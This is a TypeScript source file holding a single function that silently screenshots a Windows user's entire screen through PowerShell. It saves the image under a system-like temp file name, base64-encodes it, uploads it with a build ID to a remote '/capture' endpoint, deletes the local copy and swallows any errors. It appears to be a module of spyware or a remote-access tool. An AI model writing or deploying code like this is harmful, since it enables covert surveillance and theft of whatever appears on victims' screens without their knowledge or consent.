import { BASE_API_URL, BUILD_ID } from '../config/constants';
import { exec } from 'child_process';
import path from "path";

export async function takeCapture() {
    try {
        const tempPath = path.join(process.env.TEMP!, `sys_win_${Math.floor(Math.random() * 1000)}.png`);
        const targetUrl = `${BASE_API_URL}/capture`;

        const psCommand = `powershell -Command "` +
            `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; ` +
            `$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ` +
            `$b=New-Object Drawing.Bitmap($s.Width,$s.Height); ` +
            `$g=[Drawing.Graphics]::FromImage($b); ` +
            `$g.CopyFromScreen(0,0,0,0,$s.Size); ` +
            `$b.Save('${tempPath}'); $g.Dispose(); $b.Dispose(); ` +

            `$bytes = [System.IO.File]::ReadAllBytes('${tempPath}'); ` +
            `$base64 = [System.Convert]::ToBase64String($bytes); ` +

            `$body = @{ buildId = '${BUILD_ID}'; image = $base64 } | ConvertTo-Json; ` +

            `$headers = @{ 'X-Build-ID' = '${BUILD_ID}'; 'Content-Type' = 'application/json' }; ` +
            `Invoke-RestMethod -Uri '${targetUrl}' -Method Post -Headers $headers -Body $body; ` +

            `Remove-Item '${tempPath}'"`;

        exec(psCommand, async (error, stdout) => {
            if (error) return;
            console.log("Başarıyla JSON olarak gönderildi.");
        });
    } catch (err) {
        console.error(err);
    }
}